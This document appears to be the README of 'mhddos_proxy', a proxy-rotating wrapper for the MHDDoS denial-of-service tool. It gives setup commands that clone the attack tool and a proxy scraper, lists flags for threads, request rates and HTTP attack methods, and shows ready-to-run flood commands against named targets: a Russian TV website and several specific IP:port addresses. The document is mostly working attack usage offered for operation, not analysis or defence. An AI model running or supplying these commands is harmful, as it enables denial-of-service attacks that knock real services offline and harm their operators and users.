## Setup

    git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
    cd mhddos_proxy
    git clone https://github.com/MHProDev/MHDDoS.git
    git clone https://github.com/monosans/proxy-scraper-checker.git
    python3 -m pip install requirements.txt

# Usage

    python3 runner.py --help

    usage: runner.py [-h] [-t THREADS] [-p PERIOD] [-proxy-timeout PROXY_TIMEOUT] [-rpc RPC] [-skip-proxy-init] targets [targets ...]

    positional arguments:
      targets               List of targets, separated by spaces
    
    optional arguments:
      -h, --help             show this help message and exit
      -t THREADS             Number of threads per CPU core (default is 100)
      -p PERIOD              How often to update the proxies (default is 300)
      --proxy-timeout PROXY_TIMEOUT
                             How many seconds to wait for the proxy to make a connection.
                             Higher values give more proxies, but with lower speed/quality.
                             It also takes more time (default is 3)
      --rpc RPC              How many requests to send on a single proxy connection (default is 100)
      --http-methods         List of HTTP(s) attack methods to use. Default is GET, STRESS, BOT, DOWNLOADER.
                             Refer to MHDDoS docs for available options (https://github.com/MHProDev/MHDDoS)

# Examples

HTTP(S) Layer 7 attack - randomly chosen method from --http-methods parameter (see above for defaults).

    python3 runner.py target1 target2 target3

Target examples

- HTTP(S) by URL - `http://tvzvezda.ru` | `https://tvzvezda.ru`
- HTTP by IP:PORT - `5.188.56.124:9000`
- TCP by IP:PORT - `tcp://194.54.14.131:4477`

Increase load

    python3 runner.py -t 300 https://tvzvezda.ru

Update proxies less often (every 600s)

    python3 runner.py -p 600 https://tvzvezda.ru

More proxies

    python3 runner.py --proxy-timeout 5 https://tvzvezda.ru

# TODO

- [ ] UDP support - need MHDDoS to support SOCKS5 proxies for UDP
- [ ] Docker image
